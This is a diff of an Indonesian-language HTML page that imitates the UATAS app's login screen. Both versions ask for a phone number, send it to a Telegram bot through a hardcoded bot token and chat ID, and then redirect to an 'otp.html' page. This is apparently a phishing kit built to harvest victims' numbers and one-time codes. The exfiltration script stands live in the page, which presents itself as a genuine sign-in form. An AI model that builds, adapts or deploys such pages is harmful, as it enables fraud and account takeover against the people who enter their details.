@@ -1,209 +1,102 @@
 <html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1" name="viewport" />
-  <title>UATAS Login</title>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   UATAS
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
-
-    /* Reset and base */
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      background-color: #f8f7f7;
+   body {
       font-family: 'Inter', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    header {
-      display: flex;
-      align-items: center;
-      padding: 0.75rem 1rem;
-      color: #e05a54;
-      font-size: 0.875rem;
-      font-weight: 400;
-    }
-
-    header button {
-      background: none;
-      border: none;
-      color: #e05a54;
-      font-size: 1.25rem;
-      cursor: pointer;
-      margin-right: 1rem;
-      padding: 0;
-      display: flex;
-      align-items: center;
-    }
-
-    header h1 {
-      flex: 1;
-      text-align: center;
-      margin: 0;
-      font-weight: 400;
-    }
-
-    header .spacer {
-      width: 1.5rem; /* same width as button for symmetry */
-    }
-
-    main {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 1.5rem 1.5rem 0;
-      max-width: 24rem;
-      margin: 0 auto;
-      width: 100%;
-    }
-
-    main h2 {
-      color: #e05a54;
-      font-weight: 700;
-      font-size: 1.125rem;
-      margin-bottom: 0.75rem;
-    }
-
-    .logo-container {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      margin-bottom: 1.5rem;
-    }
-
-    .logo-container img {
-      width: 3rem;
-      height: 3rem;
-      border-radius: 0.5rem;
-      object-fit: cover;
-    }
-
-    .logo-container span {
-      color: #a71c5d;
-      font-weight: 600;
-      font-size: 1.5rem;
-      letter-spacing: 0.05em;
-    }
-
-    label {
-      display: block;
-      color: #e05a54;
-      font-size: 0.875rem;
-      margin-bottom: 0.5rem;
-    }
-
-    input[type="tel"] {
-      width: 100%;
-      background-color: #f3f3f3;
-      border-radius: 9999px;
-      padding: 0.75rem 1.5rem;
-      font-size: 1rem;
-      color: #1E1E1E;
-      border: 1px solid transparent;
-      outline: none;
-      transition: border-color 0.2s ease;
-    }
-
-    input[type="tel"]:focus {
-      border-color: transparent;
-      box-shadow: none;
-    }
-
-    button[type="submit"] {
-      margin-top: 2rem;
-      width: 100%;
-      padding: 0.75rem 0;
-      border-radius: 9999px;
-      background: linear-gradient(90deg, #f15a54 0%, #f26a54 50%, #f48a54 100%);
-      color: #f3b1aa;
-      font-weight: 600;
-      font-size: 1rem;
-      border: none;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    button[type="submit"]:hover {
-      background: linear-gradient(90deg, #f04848 0%, #f15948 50%, #f36a48 100%);
-    }
-
-    /* Responsive */
-    @media (max-width: 640px) {
-      main {
-        max-width: 100%;
-        padding: 1.5rem 1rem 0;
-      }
     }
   </style>
-</head>
-<body>
-  <header>
-    <button aria-label="Back" onclick="history.back()">
-      &#8592;
-    </button>
-    <h1>UATAS</h1>
-    <div class="spacer"></div>
+ </head>
+ <body class="bg-[#fafafa] min-h-screen flex flex-col">
+  <header class="flex items-center px-4 py-3 text-[#f16c6c] text-lg font-semibold border-b border-[#f16c6c]/30">
+   <svg class="h-6 w-6 mr-3" fill="none" stroke="#f16c6c" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <polyline points="15 18 9 12 15 6">
+    </polyline>
+   </svg>
+   UATAS
   </header>
-  <main>
-    <h2>Selamat datang di</h2>
-    <div class="logo-container">
-      <img alt="UATAS app icon with orange background and cartoon wallet with colorful cards" height="48" src="https://storage.googleapis.com/a1aa/image/0cd01ff4-94e7-4ec7-f08f-48c7f2c036af.jpg" width="48" />
-      <span>UATAS</span>
-    </div>
-    <form id="phoneForm">
-      <label for="phone">Masukkan Nomor HP anda</label>
-      <input autocomplete="tel" id="phone" name="phone" placeholder="" required type="tel" />
-      <button type="submit">Berikutnya</button>
-    </form>
+  <main class="flex flex-col items-center px-6 pt-10 w-full max-w-md mx-auto">
+   <h1 class="text-[#f16c6c] font-semibold text-lg mb-6">
+    Selamat datang di
+   </h1>
+   <div class="flex items-center space-x-3 mb-8">
+    <img alt="UATAS app icon with orange background and cartoon wallet with cards" class="w-14 h-14 rounded-md" height="60" src="https://scontent.fplm6-1.fna.fbcdn.net/v/t39.30808-6/370641863_683605137140864_1979855246816120745_n.jpg?_nc_cat=102&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=-o7BJB628J8Q7kNvwElRnUg&_nc_oc=Adk1UI80ApUVILefUq7fJnKxH3KK9DAJa7Qtn11KX6HmmZhlYiLBr3CSK-w5KN2SM8Iba8jLfg6pu1q_xBfWnMQs&_nc_zt=23&_nc_ht=scontent.fplm6-1.fna&_nc_gid=S7PVnAVmTuKvmEAaEBqiZg&oh=00_AfVGhYDDqTTAGHHJwXp5psBfx6ipmM7036x3DKWX8qfE5w&oe=689D9AD5" width="60"/>
+    <span class="text-[#b72a6a] font-extrabold text-3xl tracking-wide">
+     UATAS
+    </span>
+   </div>
+   <label class="text-[#d87f7f] mb-2 block text-base" for="phone">
+    Masukkan Nomor HP anda
+   </label>
+   <div class="w-full bg-[#f7f7f7] rounded-full flex items-center px-4 py-3 text-[#d87f7f] text-base">
+    <span class="select-none text-[#d87f7f] font-semibold mr-2">+62</span>
+    <input aria-label="Nomor HP input without country code" class="flex-1 bg-transparent outline-none placeholder-transparent" id="phone" placeholder="" type="tel"/>
+   </div>
+   <button aria-live="polite" id="sendBtn" class="mt-10 w-full py-3 rounded-full bg-gradient-to-r from-[#ff6f6f] via-[#f16c6c] to-[#f68a5f] text-[#f7b1b1] font-semibold text-base disabled:opacity-50 flex justify-center items-center" disabled="">
+    <span id="btnText">Berikutnya</span>
+    <svg aria-hidden="true" class="ml-2 h-5 w-5 animate-spin text-[#f7b1b1]" fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:none;">
+     <circle cx="12" cy="12" r="10" stroke-opacity="0.25" stroke-width="4"></circle>
+     <path d="M4 12a8 8 0 018-8" stroke-linecap="round" stroke-width="4"></path>
+    </svg>
+   </button>
   </main>
   <script>
-    // Replace these with your actual Telegram bot token and chat ID
-    const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
-    const chatId = '7549590022';
+   const phoneInput = document.getElementById('phone');
+   const sendBtn = document.getElementById('sendBtn');
+   const btnText = document.getElementById('btnText');
+   const spinner = sendBtn.querySelector('svg');
 
-    document.getElementById('phoneForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const phoneInput = document.getElementById('phone');
-      const phone = phoneInput.value.trim();
+   // Enable button only if input has value
+   phoneInput.addEventListener('input', () => {
+     sendBtn.disabled = phoneInput.value.trim() === '';
+   });
 
-      if (!phone) {
-        alert('Masukkan Nomor HP anda');
-        return;
-      }
+   sendBtn.addEventListener('click', () => {
+     const phone = phoneInput.value.trim();
+     if (!phone) return;
 
-      const message = `Nomor HP: ${phone}`;
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+     // Show loading spinner and disable button
+     btnText.textContent = 'Loading...';
+     spinner.style.display = 'inline-block';
+     sendBtn.disabled = true;
+     phoneInput.disabled = true;
 
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
+     // Telegram bot info - replace with your own bot token and chat ID
+     const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+     const chatId = '7549590022';
 
-        const data = await response.json();
+     // Include +62 prefix in the message
+     const message = encodeURIComponent(`Nomor HP: +62${phone}`);
 
-        if (data.ok) {
-          window.location = "otp.html";
-          phoneInput.value = '';
-        } else {
-          alert('Gagal mengirim data ke Telegram');
-        }
-      } catch (error) {
-        alert('Terjadi kesalahan saat mengirim data');
-      }
-    });
+     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+     fetch(url)
+       .then(response => response.json())
+       .then(data => {
+         if (data.ok) {
+           window.location = "otp.html";
+           phoneInput.value = '';
+         } else {
+           alert('Gagal mengirim data ke Telegram.');
+         }
+       })
+       .catch(() => {
+         alert('Terjadi kesalahan saat mengirim data.');
+       })
+       .finally(() => {
+         btnText.textContent = 'Berikutnya';
+         spinner.style.display = 'none';
+         sendBtn.disabled = phoneInput.value.trim() === '';
+         phoneInput.disabled = false;
+       });
+   });
   </script>
-</body>
-</html>
+ </body>
+      </html>
